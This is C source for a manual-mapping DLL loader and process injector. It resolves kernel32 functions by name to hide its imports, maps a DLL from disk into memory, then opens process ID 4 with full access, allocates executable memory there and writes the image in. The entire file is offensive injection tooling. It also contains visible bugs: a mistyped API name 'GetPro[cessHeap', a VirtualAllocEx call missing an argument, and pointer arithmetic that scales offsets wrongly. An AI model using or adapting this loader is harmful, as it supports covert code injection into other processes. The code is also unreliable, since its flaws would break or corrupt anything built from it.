#include <stdio.h>
#include "smbldr-work.h"

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;



int main(int argc, char* argv[]) {

    if (argc < 2) {
        printf("usage: %s <path to dll>", argv[0]);
        return 1;
    }


    HANDLE hProc;

    size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\kernel32.dll");

    size_t ptrCreateFileA = (size_t)GetFuncAddr(mb, "CreateFileA");
    size_t ptrGetModuleHandleA = (size_t)GetFuncAddr(mb, "GetModuleHandleA");
    size_t ptrGetFileSize = (size_t)GetFuncAddr(mb, "GetFileSize");
    size_t ptrHeapAlloc = (size_t)GetFuncAddr(mb, "HeapAlloc");
    size_t ptrGetProccessHeap = (size_t)GetFuncAddr(mb, "GetPro[cessHeap");
    size_t ptrReadFile = (size_t)GetFuncAddr(mb, "ReadFile");
    size_t ptrVirtAlloc = (size_t)GetFuncAddr(mb, "VirtualAlloc");
    size_t ptrVirtAllocEx = (size_t)GetFuncAddr(mb, "VirtualAllocEx");
    size_t ptrMultiByteToWideChar = (size_t)GetFuncAddr(mb, "MultiByteToWideChar");
    size_t ptrWriteProcessMemory = (size_t)GetFuncAddr(mb, "WriteProcessMemory");
    size_t ptrLoadLibraryA = (size_t)GetFuncAddr(mb, "LoadLibraryA");
    size_t ptrCloseHandle = (size_t)GetFuncAddr(mb, "CloseHandle");
    size_t ptrHeapFree = (size_t)GetFuncAddr(mb, "HeapFree");
    size_t ptrReadProcessMemory = (size_t)GetFuncAddr(mb, "ReadProcessMemory");
    size_t ptrGetCurrentProcess = (size_t)GetFuncAddr(mb, "GetCurrentProcess");
    size_t ptrOpenProcess = (size_t)GetFuncAddr(mb, "OpenProcess");



    PVOID cimb = ((PVOID(WINAPI*)(LPCSTR))ptrGetModuleHandleA)(NULL);


    HANDLE tdll = ((HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE))ptrCreateFileA)(argv[1], GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD64 dlsz = ((DWORD64(WINAPI*)(HANDLE, LPDWORD))ptrGetFileSize)(tdll, NULL);
    LPVOID dlbts = ((LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T))ptrHeapAlloc)(
        ((HANDLE(WINAPI*)())ptrGetProccessHeap)(),
        HEAP_ZERO_MEMORY, dlsz

        );
    DWORD outz = 0;
    ((BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPVOID))ptrReadFile)(tdll, dlbts, (DWORD)dlsz, &outz, NULL);

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(dlbts);
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((DWORD*)dlbts + dosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;



    SIZE_T dsz = ntHdr->OptionalHeader.SizeOfImage;
    LPVOID dlb = ((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))ptrVirtAlloc)(NULL, dsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD* dwlb = (DWORD*)dlb;
    DWORD_PTR dltimb = (DWORD*)dlb - (DWORD*)opH.ImageBase;
    memcpy(dlb, dlbts, opH.SizeOfHeaders);



    IMAGE_DATA_DIRECTORY relocs = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_DATA_DIRECTORY imports = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
    for (size_t i = 0; i < ntHdr->FileHeader.NumberOfSections; i++)
    {
        LPVOID vda = (LPVOID)((BYTE*)dlb + sec->VirtualAddress);
        LPVOID szrd = (LPVOID)((BYTE*)dlbts + sec->PointerToRawData);
        memcpy(vda, szrd, sec->SizeOfRawData);
        sec++;

    }

    BYTE* rctbl = (BYTE*)dlb + relocs.VirtualAddress;
    DWORD relp = 0;
    while (relp < relocs.Size) {
        PBASE_RELOCATION_BLOCK relocb = (PBASE_RELOCATION_BLOCK)(rctbl + relp);
        relp += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocnt = (relocb->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY reloce = (PBASE_RELOCATION_ENTRY)(rctbl + relp);
        for (DWORD i = 0; i < relocnt; i++) {
            
            relp += sizeof(BASE_RELOCATION_ENTRY);

            if (reloce[i].Type == 0) {
                continue;
            }

            DWORD_PTR relocrva = relocb->PageAddress + reloce[i].Offset;
            DWORD* addr2p = 0;
            ((BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T))ptrReadProcessMemory)(

                ((BOOL(WINAPI*)())ptrGetCurrentProcess)(),
                (LPCVOID)(dwlb + relocrva),
                &addr2p,
                sizeof(DWORD*),
                NULL

                );
            addr2p += dltimb;
            memcpy(dwlb + relocrva, addr2p, sizeof(DWORD*));
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR impd = (PIMAGE_IMPORT_DESCRIPTOR)(imports.VirtualAddress + dwlb);
    LPCSTR libname = "";
    HMODULE lib = NULL;
    while (impd->Name != NULL) {
        libname = (LPCSTR)(impd->Name + dwlb);

        wchar_t wlibname[256] = { 0 };
        ((int (WINAPI*)(UINT, DWORD, LPCCH, int, LPWSTR, int))ptrMultiByteToWideChar)(CP_ACP, 0, libname, -1, wlibname, 256);
        size_t modb = GetModHandle(wlibname);

        if (modb != 0) {
            PIMAGE_THUNK_DATA th = NULL;

            th = (PIMAGE_THUNK_DATA)(dwlb + impd->FirstThunk);
            while (th->u1.AddressOfData != NULL) {
                if (IMAGE_SNAP_BY_ORDINAL(th->u1.Ordinal)) {
                    WORD funcord = (WORD)IMAGE_ORDINAL(th->u1.Ordinal);

                    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
                    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
                    IMAGE_OPTIONAL_HEADER o2pH = ntHdr->OptionalHeader;
                    IMAGE_DATA_DIRECTORY exports = o2pH.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
                    PIMAGE_EXPORT_DIRECTORY exportab = (PIMAGE_EXPORT_DIRECTORY)(modb + exports.VirtualAddress);
                    DWORD* arrf = (DWORD*)(mb + exportab->AddressOfFunctions);
                    WORD idx = funcord - (WORD)exportab->Base;
                    th->u1.Function = (ULONG_PTR)(mb + arrf[idx]);

                }
                else {
                    PIMAGE_IMPORT_BY_NAME fname = (PIMAGE_IMPORT_BY_NAME)(dwlb + th->u1.AddressOfData);
                    DWORD* funca = (DWORD*)GetFuncAddr(mb, fname->Name);
                    th->u1.Function = funca;
                }
                th++;


            }

        }



        impd++;
    }







    //DLLEntry DllEntry = (DllEntry)(dwlb + opH.AddressOfEntryPoint);
    //(*DllEntry)((HINSTANCE)dlb, DLL_PROCESS_ATTACH, 0);


    hProc = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))ptrOpenProcess)(PROCESS_ALL_ACCESS, TRUE, (DWORD)4);
    LPVOID alloczone = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))ptrVirtAllocEx)(hProc,  dsz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    size_t btr = 0;
    ((BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T))ptrWriteProcessMemory)(hProc, alloczone, dlb, dsz, &btr);
     



    ((BOOL(WINAPI*)(HANDLE))ptrCloseHandle)(tdll);
    ((BOOL(WINAPI*)(HANDLE, DWORD, LPVOID))ptrHeapFree)(((HANDLE(WINAPI*)())ptrGetProccessHeap)(), 0, dlbts);

    return 0;
}